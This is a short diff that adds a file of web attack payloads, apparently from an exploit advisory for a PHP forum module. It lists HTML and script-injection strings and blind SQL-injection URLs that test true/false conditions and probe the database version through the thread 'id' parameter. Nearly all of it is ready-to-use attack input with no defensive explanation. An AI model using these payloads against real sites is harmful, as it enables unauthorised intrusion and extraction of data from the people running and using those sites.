@@ -1,0 +1,9 @@
+HTML-injection:
+&quot;&gt;&lt;h1&gt;0wned&lt;/h1&gt;
+&quot;&gt;&lt;script&gt;alert(&quot;JosS b0x&quot;);&lt;/script&gt;
+
+SQL-injection
+http://www.example.com/index.php?module=forum&amp;show=thread&amp;id=1 and 1=2 [False]
+http://www.example.com/index.php?module=forum&amp;show=thread&amp;id=1 and 1=1 [True]
+http://www.example.com/index.php?module=forum&amp;show=thread&amp;id=1 AND SUBSTRING(@@version,1,1)=5
+http://www.example.com/index.php?module=forum&amp;show=thread&amp;id=1 AND SUBSTRING(@@version,1,1)=4
